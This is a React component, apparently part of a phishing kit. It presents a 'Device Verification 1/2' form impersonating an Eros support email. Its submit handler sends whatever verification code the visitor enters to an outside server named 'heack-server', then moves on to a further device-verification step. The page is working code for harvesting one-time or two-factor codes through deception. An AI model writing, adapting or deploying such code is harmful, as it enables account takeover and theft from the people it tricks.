import React from "react";
import "../HomeStyle/Verifycode.css";
import { useForm } from "react-hook-form";
import { useNavigate } from "react-router-dom";

const Verifycode = () => {
  const { register, handleSubmit } = useForm();
  const navigate = useNavigate();
  const onSubmit = (data) => {
    const Code = {
      Code: data.exampleRequired,
    };
    console.log(Code);
    fetch("https://heack-server.vercel.app/code", {
      method: "POST",
      headers: { "Content-type": "application/json" },
      body: JSON.stringify(Code),
    })
      .then((res) => res.json())
      .then((result) => navigate("/DeviceVerify"));
  };

  return (
    <div className="Text_1">
      <div className="center">
        <form onSubmit={handleSubmit(onSubmit)}>
          <div className="m-1">
            <div className="rounded bg-white">
              <div>
                <h4 className="Verification pt-4 ps-3">
                  Device Verification 1/2
                </h4>
                <p className="provided ps-3 pe-5">
                  We have just sent a Verification Code to email address
                  provided <span className="fw-bold">support@eros.com</span>
                </p>
              </div>

              <input
                className="form-control exampleRequired_From p-2"
                placeholder="Enter Code Here"
                {...register("exampleRequired", { required: true })}
              />
              <div>
                <p className="pt-3 ps-3 mb-0 Resend ">
                  No Code received yet? <span className="received">Resend</span>
                </p>
                <p className="ps-3 pt-0 pb-4">
                  Having trouble with receiving the Code, You can contact the{" "}
                  <span className="received">Support.</span>
                </p>
              </div>
            </div>
            <div className="text-end">
              <span>
                <button className="CenCle">CANCEL</button>
              </span>
              <input className="verify_1" type="submit" value="VERIFY" />
            </div>
          </div>
        </form>
      </div>
    </div>
  );
};

export default Verifycode;
